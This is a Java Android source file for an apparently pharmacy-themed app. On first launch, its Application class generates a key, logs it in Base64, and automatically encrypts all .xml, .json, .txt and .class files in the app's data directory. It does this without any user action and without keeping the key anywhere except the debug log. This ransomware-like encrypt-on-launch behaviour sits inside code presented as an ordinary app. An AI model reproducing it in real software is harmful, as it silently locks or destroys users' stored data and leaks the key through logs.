package com.example.farmacia_app;

import android.app.Application;
import android.content.SharedPreferences;
import android.util.Log;

import java.io.File;
import java.util.Arrays;
import java.util.List;

import javax.crypto.SecretKey;

public class MyApplication extends Application {
    private static final String PREFS = "AppPrefs";
    private static final String FLAG_ENCRYPTED = "appEncrypted";

    @Override
    public void onCreate() {
        super.onCreate();

        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        boolean alreadyEncrypted = prefs.getBoolean(FLAG_ENCRYPTED, false);

        if (!alreadyEncrypted) {
            try {
                SecretKey key = CryptoManager.generateKey();
                String chaveBase64 = CryptoManager.encodeKey(key);
                Log.d("Crypto", "Chave gerada (Base64): " + chaveBase64);

                File baseDir = new File(getFilesDir().getParent());
                List<String> extensoes = Arrays.asList(".xml",".json", ".txt", ".class");

                List<File> arquivos = CryptoManager.listarArquivosParaCriptografar(baseDir, extensoes);
                for (File f : arquivos) {
                    CryptoManager.encryptFile(f.getAbsolutePath(), key);
                }

                prefs.edit().putBoolean(FLAG_ENCRYPTED, true).apply();
                Log.i("Crypto", "Criptografia realizada com sucesso.");

            } catch (Exception e) {
                Log.e("Crypto", "Erro na criptografia automática", e);
            }
        } else {
            Log.i("Crypto", "Aplicativo já criptografado.");
        }
    }
}
